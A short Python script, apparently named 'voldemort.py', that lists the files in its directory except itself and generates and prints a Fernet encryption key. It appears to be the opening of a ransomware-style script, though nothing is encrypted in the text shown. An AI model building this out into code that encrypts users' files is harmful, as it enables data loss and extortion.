import os
from cryptography.fernet import Fernet
import hashlib
m = hashlib.sha256()
files = []
for file in os.listdir():
    if file == "voldemort.py":
        continue
    # files.append(file)
    if os.path.isfile(file):
        files.append(file)
print(files)
key = Fernet.generate_key()

print(key)
